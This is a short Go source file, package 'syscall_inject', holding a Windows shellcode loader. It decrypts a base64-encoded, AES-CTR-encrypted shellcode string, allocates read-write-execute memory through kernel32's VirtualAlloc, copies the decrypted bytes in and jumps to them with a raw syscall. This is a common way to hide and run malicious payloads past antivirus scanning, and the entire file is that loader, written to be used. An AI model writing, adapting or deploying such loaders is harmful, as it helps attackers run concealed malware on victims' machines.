package syscall_inject

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32     = syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
)

func ShellCodeSyscall(Shellcode string, password string) {
	ciphertext, _ := base64.StdEncoding.DecodeString(Shellcode)
	key, _ := base64.StdEncoding.DecodeString(password)
	block, _ := aes.NewCipher(key)
	plaintext := make([]byte, len(ciphertext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(plaintext, ciphertext)
	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(plaintext)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))

	for i := 0; i < len(plaintext); i++ {
		AddrPtr[i] = plaintext[i]
	}

	syscall.Syscall(Addr, 0, 0, 0, 0)
}
